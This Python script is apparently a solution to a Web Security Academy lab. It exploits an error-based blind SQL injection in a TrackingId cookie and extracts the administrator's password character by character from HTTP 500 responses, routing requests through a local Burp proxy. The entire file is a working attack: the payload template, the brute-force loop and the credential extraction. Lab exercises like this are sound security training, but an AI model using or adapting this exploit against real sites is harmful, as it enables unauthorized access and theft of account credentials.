import sys
import requests
import urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def check_url_exists(url):
    res = requests.get(url, verify=False, proxies=proxies)
    if "<h1>Error</h1><p>Stream&#32;failed&#32;to&#32;close&#32;correctly</p>" in res.text:
        print("[-] ERROR: The webpage you are requesting does not exist...")
        exit() # exit program

def exploit_sqli_password(url):
    password_extracted = ""
    num_chars_in_password = 20

    # you can view the GET requests that is happening in Burp Suite HTTP history
    for i in range(1, num_chars_in_password + 1):
        for j in range(32, 126): # ASCII codes (space to ~ i.e. alphanumeric characters and special characters)
            sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ASCII(SUBSTR(password,%s,1))='%s') || '" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            trackingIdCookie = "nnMPuRMLg5DqXoCF" # obtain these two cookies via Network tab, Cookie Editor extension on browser, or Burp Suite proxy intercept
            sessionCookie = "Io41EwORHzelK1Pjtebl4HqIM3Vdr5GL"
            cookies = {
                'TrackingId': trackingIdCookie + sqli_payload_encoded,
                'session': sessionCookie
            }
            res = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

            if res.status_code == 500:
                password_extracted += chr(j) # convert ASCII j to character
                sys.stdout.write("\r" + password_extracted)
                sys.stdout.flush()
                break # found a matching character in the password; break out of loop
            else:
                sys.stdout.write("\r" + password_extracted + chr(j))
                sys.stdout.flush()
    print()

def main():
    if len(sys.argv) != 2:
        print('[+] Usage: %s "<url>"' % sys.argv[0])
        print('[+] Example: %s "www.example.com"' % sys.argv[0])
    
    url = sys.argv[1]
    print("[+] Brute-force administrator password with SQLi payloads without triggering 'maximum X retries reached' message.")
    print("[+] Retrieving administrator password...")
    check_url_exists(url) # the Web Security Academy page may timeout; this tells us whether that has happened or not
    exploit_sqli_password(url) # outputs password of administrator; shows in real time all diff characters it's trying
    print("[+] Brute-force exploit completed.")


if __name__ == "__main__":
    main()